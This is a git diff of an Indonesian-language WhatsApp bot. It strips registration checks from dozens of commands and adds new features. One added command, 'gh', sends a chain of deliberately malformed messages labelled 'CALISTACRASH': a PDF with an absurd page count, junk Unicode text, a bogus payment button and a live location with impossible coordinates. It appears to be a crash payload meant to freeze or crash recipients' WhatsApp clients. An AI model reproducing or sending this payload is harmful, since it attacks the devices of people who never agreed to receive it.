 				if (!text) return sycreply('Masukkan lokasi! Contoh: cekcuaca Jakarta');
 				try {
 					const url = `https://wttr.in/${encodeURIComponent(text)}?format=%l:+%C+%t+%h+%w`;
@@ -3999,7 +12122,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'bluearchive': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					// Mengirim gambar langsung tanpa memerlukan input teks
 					await sych.sendMessage(m.chat, {
@@ -4015,7 +12138,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'delowner':
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     if (!isCreator) return sycreply('Perintah ini hanya dapat digunakan oleh creator!');
     if (!args[0]) return sycreply('Masukkan nomor yang ingin dihapus dari owner!');
     const removeOwner = args[0].replace(/[^0-9]/g, '');
@@ -4038,7 +12161,7 @@ for (const emoji of reactEmojis) {
     sycreply(`Daftar Owner:\n${ownerList}`);
     break;
 			case 'cjpn': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					sycreply(mess.wait);
 
@@ -4074,7 +12197,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'ckorea': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					sycreply(mess.wait);
 
@@ -4111,7 +12234,7 @@ for (const emoji of reactEmojis) {
 			break;
 			// CASE untuk memulai chat rahasia
 			case 'startsecret': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!m.isGroup) return sycreply('Fitur ini hanya bisa digunakan di grup!');
 				let target = m.mentionedJid[0]; // Ambil pengguna yang ditandai
 				if (!target) return sycreply('Tag pengguna yang ingin diajak chat rahasia!');
@@ -4131,7 +12254,7 @@ for (const emoji of reactEmojis) {
 			break;
 			// CASE untuk mengirim pesan rahasia
 			case 'secretmsg': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!secretChat[m.sender]) return sycreply('Kamu tidak berada dalam sesi rahasia!');
 				let partner = secretChat[m.sender].partner;
 				let msg = text; // Ambil teks dari pengguna
@@ -4148,7 +12271,7 @@ for (const emoji of reactEmojis) {
 			break;
 			// CASE untuk mengakhiri sesi chat rahasia
 			case 'endsecret': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!secretChat[m.sender]) return sycreply('Kamu tidak berada dalam sesi rahasia!');
 				let partner = secretChat[m.sender].partner;
 				// Hapus sesi rahasia
@@ -4161,7 +12284,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'cindo': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					sycreply(mess.wait);
 
@@ -4197,7 +12320,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'cthai': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					sycreply(mess.wait);
 
@@ -4233,7 +12356,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'cviet': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					sycreply(mess.wait);
 
@@ -4268,8 +12391,50 @@ for (const emoji of reactEmojis) {
 				}
 			}
 			break;
+		
+case 'bratvid': {
+     
+    if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`*${prefix + command}* Teksnya`);
+
+    try {
+        console.log('Mengambil video dari API...');
+        const response = await fetch('https://fgsi-brat.hf.space/?text=' + encodeURIComponent(text || m.quoted.text) + '&isVideo=true');
+        if (!response.ok) throw new Error('API gagal merespons');
+
+        const buffer = await response.arrayBuffer();
+        const videoPath = './temp_video.mp4';
+        const stickerPath = './temp_sticker.webp';
+
+        // Simpan video sementara
+        fs.writeFileSync(videoPath, Buffer.from(buffer));
+
+        // Konversi ke WebP (stiker animasi)
+        console.log('Mengonversi video ke WebP (stiker animasi)...');
+        exec(`ffmpeg -i ${videoPath} -vf "scale=512:512:flags=lanczos,fps=15" -loop 0 -preset default -an -vsync 0 -s 512x512 ${stickerPath}`, async (error) => {
+            if (error) {
+                console.error('Error saat konversi ke WebP:', error);
+                return sycreply('Gagal mengonversi video ke stiker animasi.');
+            }
+
+            console.log('Konversi selesai, mengirim stiker animasi...');
+            
+            await sych.sendMessage(m.chat, {
+                sticker: fs.readFileSync(stickerPath)
+            }, { quoted: m });
+
+            console.log('Stiker berhasil dikirim, membersihkan file sementara...');
+            fs.unlinkSync(videoPath);
+            fs.unlinkSync(stickerPath);
+        });
+
+    } catch (e) {
+        console.error('Error:', e.message);
+        sycreply('Server Brat Sedang Offline atau terjadi kesalahan!');
+    }
+}
+break;
 			case 'cchina': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					sycreply(mess.wait);
 
@@ -4306,7 +12471,7 @@ for (const emoji of reactEmojis) {
 			break;
 			case 'trigger':
 			case 'triggered': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					if (/jpg|jpeg|png/.test(mime)) {
 						sycreply(mess.wait);
@@ -4343,7 +12508,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'setexif': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!isCreator) return sycreply(mess.owner)
 				if (!text) return sycreply(`*< / >* Example : ${prefix + command} packname|author`)
 				global.packname = text.split("|")[0]
@@ -4352,12 +12517,12 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'nulis': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				sycreply(`**< / >* Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
 			}
 			break
 			case 'nuliskiri': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`Kirim perintah *${prefix + command}* Teksnya`)
 				sycreply(mess.wait);
 
@@ -4388,7 +12553,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'nuliskanan': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`Kirim perintah *${prefix + command}* Teksnya`)
 				sycreply(mess.wait);
 
@@ -4419,7 +12584,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'foliokiri': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`Kirim perintah *${prefix + command}* Teksnya`)
 				sycreply(mess.wait);
 
@@ -4453,7 +12618,7 @@ for (const emoji of reactEmojis) {
 			case 'ttstalk':
 			case 'tiktokprofile':
 			case 'ttprofile': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) {
 					console.log('TikTok username not provided.');
 					return sycreply('*< / >* Example: ' + prefix + command + ' username_tiktok');
@@ -4493,7 +12658,7 @@ for (const emoji of reactEmojis) {
 				break;
 			}
 			case 'foliokanan': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`Kirim perintah *${prefix + command}* Teksnya`)
 				sycreply(mess.wait);
 
@@ -4524,7 +12689,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'liriksearch': case 'liriks': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     if (!text) {
         console.log('Lirik lagu tidak diberikan.');
         return sycreply('Contoh: ' + prefix + command + ' tak bisa ku teruskan dunia kita berbeda');
@@ -4597,7 +12762,7 @@ for (const emoji of reactEmojis) {
 			case 'slow':
 			case 'smooth':
 			case 'tupai': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					let set;
 					if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
@@ -4652,7 +12817,7 @@ for (const emoji of reactEmojis) {
 			case 'tinyurl':
 			case 'shorturl':
 			case 'shortlink': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text || !isUrl(text)) return sycreply(`*< / >* Example: ${prefix + command} https://github.com/nazedev/hitori`)
 				try {
 					let anu = await axios.get('https://tinyurl.com/api-create.php?url=' + text)
@@ -4664,7 +12829,7 @@ for (const emoji of reactEmojis) {
 			break
 			case 'git':
 			case 'gitclone': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!args[0]) return sycreply(`*< / >* Example: ${prefix + command} https://github.com/nazedev/hitori`)
 				if (!isUrl(args[0]) && !args[0].includes('github.com')) return sycreply('Gunakan Url Github!')
 				let [, user, repo] = args[0].match(/(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i) || []
@@ -4687,7 +12852,7 @@ for (const emoji of reactEmojis) {
 			// Variabel global untuk menyimpan status auto AI
 			// Case untuk mengatur autoai
 			case 'autoai': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!isCreator) return sycreply(mess.owner); // Memeriksa apakah pengirim adalah pembuat bot
 				if (!text) return sycreply(`Gunakan: ${prefix + command} on/off`); // Memastikan ada teks untuk mengaktifkan/mematikan
 				if (text.toLowerCase() === 'on') {
@@ -4715,7 +12880,7 @@ for (const emoji of reactEmojis) {
 			}
 			// Case untuk AI utama
 			case 'ai': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} query`);
 				try {
 					let prompt = `${userPrompt}: ${text}`;
@@ -4733,8 +12898,8 @@ for (const emoji of reactEmojis) {
 				break;
 			}
 			// Auto AI: memproses semua pesan secara otomatis jika autoAi aktif
-			case 'simi': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			case 'ika': {
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} query`)
 				try {
 					const hasil = await simi(text)
@@ -4745,7 +12910,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'txt2img': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`)
 				try {
 					sycreply(mess.wait);
@@ -4775,7 +12940,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'aimg': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`)
 				try {
 					sycreply(mess.wait);
@@ -4805,7 +12970,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'dukun': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     if (!text) return sycreply(`Kirim perintah *${prefix + command}* diikuti dengan nama yang ingin dicari artinya.`);
     const nama = text.trim();
     const loadingMessage = await sycreply('Sedang mencari arti nama... Mohon tunggu sebentar.');
@@ -4843,7 +13008,7 @@ for (const emoji of reactEmojis) {
 break;
 			// Search Menu
 			case 'google': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} query`)
 				try {
 					let anu = await google.search(text);
@@ -4881,7 +13046,7 @@ break;
 			}
 			break
 			case 'play2': case 'ytplay2': case 'yts2': case 'ytsearch2': case 'youtubesearch2': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     if (!text) return sycreply(`Example: ${prefix + command} dj komang`);
     sycreply(mess.wait);
 
@@ -4905,7 +13070,7 @@ break;
 }
 break;
 			case 'typodetect': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     if (!isCreator) return sycreply("Fitur ini hanya bisa digunakan oleh owner.");
     if (!args[0]) return sycreply("Penggunaan: *typodetect on* atau *typodetect off*");
 
@@ -4920,7 +13085,7 @@ break;
     }
 }
 			case 'play': case 'ytplay': case 'yts': case 'ytsearch': case 'youtubesearch': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     if (!text) return sycreply(`Example: ${prefix + command} dj komang`);
     sycreply(mess.wait);
 
@@ -4943,97 +13108,9 @@ break;
     }
 }
 break;
-			case 'pinterest':
-			case 'pint': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
-				if (!text) return sycreply(`*< / >* Example: ${prefix + command} hu tao`);
-				try {
-					sycreply(mess.wait);
 
-// Emoji yang akan digunakan
-const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];
-
-// Mengirimkan reaksi secara berurutan
-for (const emoji of reactEmojis) {
-    await sych.sendMessage(m.chat, {
-        react: {
-            text: emoji,
-            key: m.key
-        }
-    });
-}
-					let anu = await pinterest(text); // Panggil API pencarian Pinterest
-					if (anu.length < 1) return sycreply('Pencarian tidak ditemukan!');
-					// Batasi hasil ke 5 item teratas dan siapkan carousel card
-					const carouselCards = await Promise.all(anu.slice(0, 5).map(async (url, index) => ({
-						header: {
-							title: `Hasil ${index + 1}`,
-							hasMediaAttachment: true,
-							imageMessage: (await generateWAMessageContent({
-								image: {
-									url
-								}
-							}, {
-								upload: sych.waUploadToServer
-							})).imageMessage
-						},
-						body: {
-							text: "Hasil pencarian Pinterest untuk: " + text
-						},
-						footer: {
-							text: "Klik tombol di bawah untuk melihat sumber."
-						},
-						nativeFlowMessage: {
-							buttons: [{
-								"name": "cta_url",
-								"buttonParamsJson": JSON.stringify({
-									display_text: "Lihat di Pinterest",
-									url
-								})
-							}]
-						}
-					})));
-					// Buat pesan carousel
-					const carouselMessage = generateWAMessageFromContent(m.chat, {
-						viewOnceMessage: {
-							message: {
-								messageContextInfo: {
-									deviceListMetadata: {},
-									deviceListMetadataVersion: 2
-								},
-								interactiveMessage: proto.Message.InteractiveMessage.fromObject({
-									body: {
-										text: `Hasil pencarian untuk: ${text}`
-									},
-									footer: {
-										text: "Pinterest Bot by Sych"
-									},
-									header: {
-										hasMediaAttachment: false
-									},
-									carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
-										cards: carouselCards
-									})
-								})
-							}
-						}
-					}, {});
-					// Kirim pesan carousel
-					await sych.relayMessage(m.chat, carouselMessage.message, {
-						messageId: carouselMessage.key.id
-					});
-				} catch (e) {
-					console.error("Kesalahan saat mengirim carousel:", e);
-					await sych.sendMessage(m.chat, {
-						text: "Terjadi kesalahan saat memproses permintaan. Silakan coba lagi atau hubungi admin."
-					}, {
-						quoted: m
-					});
-				}
-			}
-			break;
 			case 'wallpaper': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} hu tao`)
 				try {
 					let anu = await wallpaper(text)
@@ -5056,7 +13133,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'checklocation': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!isCreator) return sycreply('Fitur ini hanya dapat digunakan oleh owner bot.');
 				let ipUrl = 'https://ipinfo.io/json';
 				try {
@@ -5076,14 +13153,14 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'cermin': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply('Harap masukkan teks yang ingin dibalik!');
 				const reversedText = text.split('').reverse().join('');
 				sycreply(`Hasil:\n${reversedText}`);
 			}
 			break;
 			case 'ringtone': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} black rover`)
 				let anu = await ringtone(text)
 				let result = pickRandom(anu)
@@ -5099,7 +13176,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'analyzechats': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     if (!m.isGroup) return sycreply('Fitur ini hanya bisa digunakan di grup!');
     const chatData = store.messages[m.chat]?.array || [];
     const userActivity = {};
@@ -5116,7 +13193,7 @@ for (const emoji of reactEmojis) {
 break;
 			case 'npm':
 			case 'npmjs': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} axios`)
 				let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
 				let {
@@ -5132,7 +13209,7 @@ break;
 			}
 			break
 			case 'style': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} sych`)
 				let anu = await styletext(text)
 				let txt = anu.map(a => `*${a.name}*\n${a.result}`).join`\n\n`
@@ -5141,7 +13218,7 @@ break;
 			break
 			case 'spotify':
 			case 'spotifysearch': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} alan walker alone`)
 				const reactEmojis = ["🎵", "🎶", "🔍", "🎶", "🎵", "✅"];
         for (const emoji of reactEmojis) {
@@ -5174,7 +13251,7 @@ break;
 	
 
 case 'ply':
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!args.length) {
         await sych.sendMessage(m.chat, { text: 'Masukkan judul lagu atau video. Contoh: /play Despacito' }, { quoted: fkontak });
         break;
@@ -5247,7 +13324,7 @@ await sych.sendMessage(m.chat, { text: 'Memproses audio...' }, { quoted: fkontak
 
 			//search
 		case 'search': case 'ytsearch': {
-		    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+		     
     if (!text) return sycreply(`Contoh: ${prefix + command} dj tiktok`);
     sycreply(mess.wait, { quoted: fkontak });
 
@@ -5329,7 +13406,7 @@ await sych.sendMessage(m.chat, { text: 'Memproses audio...' }, { quoted: fkontak
 case 'ytmp4':
 case 'ytvideo':
 case 'ytv': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!text) {
         await sych.sendMessage(m.chat, { text: `Contoh: ${prefix + command} https://youtu.be/videoId` }, { quoted: m });
         break;
@@ -5367,11 +13444,755 @@ case 'ytv': {
     break;
 }
 
+
+case 'gh': {
+          const gg = "ꦽ";
+          const ggg = "ꦿꦾ";
+          sych.relayMessage(m.chat, {
+            viewOnceMessage: {
+              message: {
+                extendedTextMessage: {
+                  text: " '  ᄃΛᄂIƧƬΛᄃЯΛƧΉ'\n" + gg,
+                  previewType: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
+                  contextInfo: {
+                    mentionedJid: ["916909137213@s.whatsapp.net", "916909137213@s.whatsapp.net"]
+                  }
+                }
+              }
+            }
+          },{ userJid: m.chat, quoted: fkontak });
+          await sych.relayMessage(m.chat, {
+            viewOnceMessage: {
+              message: {
+                interactiveMessage: {
+                  body: {
+                    text: "akujelek?"
+                  },
+                  footer: {
+                    text: ""
+                  },
+                  header: {
+                    documentMessage: {
+                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
+                      mimetype: "application/pdf",
+                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
+                      fileLength: null,
+                      pageCount: 99999999999999,
+                      contactVcard: true,
+                      caption: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
+                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
+                      fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ ",
+                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
+                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
+                      mediaKeyTimestamp: "1714145232",
+                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
+                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
+                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
+                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
+                      thumbnailHeight: 172,
+                      thumbnailWidth: 480
+                    },
+                    hasMediaAttachment: true
+                  },
+                  nativeFlowMessage: {
+                    buttons: [{
+                      name: "single_select",
+                      buttonParamsJson: JSON.stringify({
+                        title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
+                        sections: [{
+                          title: "",
+                          rows: [{
+                            title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
+                            id: ".huii"
+                          }]
+                        }]
+                      })
+                    }]
+                  },
+                  contextInfo: {
+            mentionedJid: [m.sender],
+            forwardingScore: 999,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo: {
+                newsletterName: "Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦",
+                newsletterJid: "120363373320014871@newsletter",
+                serverMessageId: 143
+            }
+        },
+                  disappearingMode: {
+                    initiator: "INITIATED_BY_ME",
+                    inviteLinkGroupTypeV2: "DEFAULT",
+                    messageContextInfo: {
+                      deviceListMetadata: {
+                        senderTimestamp: "1678285396",
+                        recipientKeyHash: "SV5H7wGIOXqPtg==",
+                        recipientTimestamp: "1678496731",
+                        deviceListMetadataVersion: 2
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          },  { userJid: m.chat, quoted: fkontak });
+          await sych.relayMessage(m.chat, {
+            viewOnceMessage: {
+              message: {
+                locationMessage: {
+                  degreesLatitude: -21.980324912168495,
+                  degreesLongitude: 24.549921490252018,
+                  name: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ" + ggg,
+                  address: "",
+                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
+                }
+              }
+            }
+          }, { userJid: m.chat, quoted: fkontak });
+          await sych.relayMessage(m.chat, {
+            botInvokeMessage: {
+              message: {
+                messageContextInfo: {
+                  deviceListMetadataVersion: 2,
+                  deviceListMetadata: {}
+                },
+                interactiveMessage: {
+                  nativeFlowMessage: {
+                    buttons: [{
+                      name: "payment_info",
+                      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄드림 가이 Cela;\",\"key\":\"🦄드림 가이 Cela\",\"key_type\":\"RANDOM\"}}]}"
+                    }]
+                  }
+                }
+              }
+            }
+          },  { userJid: m.chat, quoted: fkontak });
+          await sych.relayMessage(m.chat, {
+            viewOnceMessage: {
+              message: {
+                liveLocationMessage: {
+                  degreesLatitude: 11111111,
+                  degreesLongitude: -111111,
+                  caption: "xeontex",
+                  url: "https://" + "" + ".com",
+                  sequenceNumber: "1678556734042001",
+                  jpegThumbnail: null,
+                  expiration: 7776000,
+                  ephemeralSettingTimestamp: "1677306667",
+                  disappearingMode: {
+                    initiator: "INITIATED_BY_ME",
